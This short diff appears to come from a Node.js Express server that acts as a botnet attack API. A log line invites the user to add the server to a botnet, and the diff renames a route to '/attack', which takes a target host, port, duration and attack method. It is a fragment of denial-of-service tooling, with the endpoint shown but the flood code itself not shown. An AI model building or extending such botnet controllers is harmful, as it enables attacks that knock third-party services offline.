@@ -11,7 +11,7 @@ console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
 return data
 }
 
-app.get('/kudel', (req, res) => {
+app.get('/attack', (req, res) => {
   const { host, port, time, methods } = req.query;
   
   if (!host || !port  || !time || !methods) {
